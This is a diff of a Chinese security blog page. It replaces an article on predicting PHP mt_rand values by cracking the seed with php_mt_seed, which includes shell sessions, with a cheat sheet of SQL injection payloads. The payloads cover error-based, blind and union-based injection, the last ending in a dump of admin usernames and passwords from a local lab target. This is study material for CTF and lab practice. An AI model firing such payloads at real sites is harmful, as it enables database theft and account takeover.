@@ -4,12 +4,13 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>php随机数函数安全 | FreeV&#39;s Blog</title>
+    <title>sql注入梳理（1） | FreeV&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
     
     <meta name="author" content="FreeV">
     
-    <meta name="description" itemprop="description" content="rand() mt_rand() mt_srand()函数安全问题">
+    <meta name="description" content="判断数据库;    mysql    and length(2)=1  char_length(1)=1    mssql   and len(1)=1  DATALENGTH    oracle and lengthb(1)=1
+报错注入：    有错误回显    select  from adm">
     
     
     
@@ -67,7 +68,7 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2016/09/12/php随机数函数安全/" title="php随机数函数安全" itemprop="url">php随机数函数安全</a>
+      <a href="/2016/10/27/sql注入梳理（1）/" title="sql注入梳理（1）" itemprop="url">sql注入梳理（1）</a>
   </h1>
   
   <p class="article-author">By
@@ -78,36 +79,33 @@
 			本文总阅读量<span id="busuanzi_value_page_pv"></span>次
 		</span>
   <p class="article-time">
-    <time datetime="2016-09-12T08:53:34.000Z" itemprop="datePublished">2016-09-12</time>
-    更新日期:<time datetime="2016-10-05T06:49:37.577Z" itemprop="dateModified">2016-10-05</time>
+    <time datetime="2016-10-27T11:53:48.000Z" itemprop="datePublished">2016-10-27</time>
+    更新日期:<time datetime="2016-10-29T15:13:20.202Z" itemprop="dateModified">2016-10-29</time>
     
   </p>
 </header>
 	<div class="article-content">
 		
 		
-		<h1 id="0x00_rand_28_29_u51FD_u6570"><a href="#0x00_rand_28_29_u51FD_u6570" class="headerlink" title="0x00 rand()函数"></a>0x00 rand()函数</h1><p>rand()的随机数默认最大32767，可以用于爆破这里不再举例。</p>
-<h2 id="0x01_mt_rand_28_29_u548Cmt_srand_28_29_u51FD_u6570"><a href="#0x01_mt_rand_28_29_u548Cmt_srand_28_29_u51FD_u6570" class="headerlink" title="0x01 mt_rand()和mt_srand()函数"></a>0x01 mt_rand()和mt_srand()函数</h2><p>mt_srand()函数用于播种，PHP 4.2.0 起，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，当PHP版本到了5.2.1后，通过修改算法修补了奇数和偶数的播种相等的问题，这样也导致了php5.2.0前后导致同一个播种后的mt_rand()的值不一样<br>5.2.6&gt;php&gt;4.2.0默认播种的算法也不是很强悍，当目标&gt;5.20时候，我们exp运行的环境也要是&gt;5.20的版本，mt_rand处理的数据都是不安全的。在web应用里很多都使用mt_rand来处理随机的session，比如密码找回功能等等。<br>如果你知道一个mt_rand()的值就可以，就可以推断出mt_srand()的种子值，从而推断出下一个mt_rand()值。<br>工具:<a href="http://download.openwall.net/pub/projects/php_mt_seed/php_mt_seed-3.2.tar.gz" target="_blank" rel="external">http://download.openwall.net/pub/projects/php_mt_seed/php_mt_seed-3.2.tar.gz</a></p>
-<p>root@kali:~# php5 -r ‘mt_srand(123123123); echo mt_rand(),”\n”; echo mt_rand(),”\n”;’<br>519979806<br>1474031914</p>
-<p>root@kali:~/php_mt_seed-3.2# ./php_mt_seed 519979806<br>Found 0, trying 100663296 - 134217727, speed 34831590 seeds per second<br>seed = 123123123<br>Found 1, trying 1509949440 - 1543503871, speed 34497359 seeds per second<br>seed = 1525862101<br>Found 2, trying 3992977408 - 4026531839, speed 34601190 seeds per second<br>seed = 3994356879<br>Found 3, trying 4261412864 - 4294967295, speed 34578163 seeds per second<br>Found 3</p>
-<p>可见程序给出了三个种子，逐个测试即可：<br>root@kali:~# php5 -r ‘mt_srand(1525862101); echo mt_rand(),”\n”; echo mt_rand(),”\n”;’<br>519979806<br>14803299<br>root@kali:~# php5 -r ‘mt_srand(3994356879); echo mt_rand(),”\n”; echo mt_rand(),”\n”;’<br>519979806<br>978260809</p>
-<p>123123123为真正的种子，这样就可以轻松拿到真正的种子，下一个要产生的随机数也就知道了</p>
-<pre><code>Author:FreeV
-</code></pre>  
+		<p>判断数据库;<br>    mysql    and length(2)=1  char_length(1)=1<br>    mssql   and len(1)=1  DATALENGTH<br>    oracle and lengthb(1)=1</p>
+<p>报错注入：<br>    有错误回显<br>    select <em> from admin where id=123<br>    select </em> from admin where id=123 and exp(~(select <em>from (select VERSION())a))<br>    select </em> from admin where id=123 and updatexml(1,concat(0x5e,(select user()),0x5e),1)<br>盲注：<br>    time<br>    select * from admin where id =’123’ and (IF((ascii(substr((version()),1,1))=53),sleep(3),sleep(0)))</p>
+<pre><code>bool
+select * from admin where id =&apos;123&apos; and(ascii(substr(version(),1,1))=53)
+
+select * from admin where id =&apos;123&apos; and ascii(substr((version()),1,1))=53
+select * from admin where id =&apos;123&apos; and substr((select flag from flag limit 0,1),1,1)=&apos;f&apos;
+</code></pre><p>union注入：<br>    有回显数据 order by 之前<br>    判断 列数<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=123</a>‘ order by  3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,2,3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,version(),3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(table_name),3 from  information_schema.tables where table_schema=database()%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(column_name),3 from  information_schema.columns where table_name=0x61646D696E%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(username,0x5e,password),3 from  admin%23</p>
+<p>sleep benchmark函数的安全问题<br>判断表 字段<br>快速注入：<br>exists(substr((select flag from flag),1,1)=’f’)</p>
+  
 	</div>
 		<footer class="article-footer clearfix">
-
-  <div class="article-tags">
-  
-  <span></span> <a href="/tags/php代码安全/">php代码安全</a>
-  </div>
 
 
 
 
 <div class="article-share" id="share">
 
-  <div data-url="http://yoursite.com/2016/09/12/php随机数函数安全/" data-title="php随机数函数安全 | FreeV&#39;s Blog" data-tsina="null" class="share clearfix">
+  <div data-url="http://yoursite.com/2016/10/27/sql注入梳理（1）/" data-title="sql注入梳理（1） | FreeV&#39;s Blog" data-tsina="null" class="share clearfix">
   </div>
 
 </div>
@@ -116,19 +114,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2016/10/27/sql注入梳理（1）/" title="sql注入梳理（1）">
-  <strong>PREVIOUS:</strong><br/>
-  <span>
-  sql注入梳理（1）</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2016/09/10/sql注入之最短姿势/"  title="sql注入之最短姿势">
+<a href="/2016/09/12/php随机数函数安全/"  title="php随机数函数安全">
  <strong>NEXT:</strong><br/> 
- <span>sql注入之最短姿势
+ <span>php随机数函数安全
 </span>
 </a>
 </div>
@@ -145,7 +135,7 @@
 
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
-  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00_rand_28_29_u51FD_u6570"><span class="toc-number">1.</span> <span class="toc-text">0x00 rand()函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01_mt_rand_28_29_u548Cmt_srand_28_29_u51FD_u6570"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 mt_rand()和mt_srand()函数</span></a></li></ol></li></ol>
+  
   </div>
 
 <div id="asidepart">
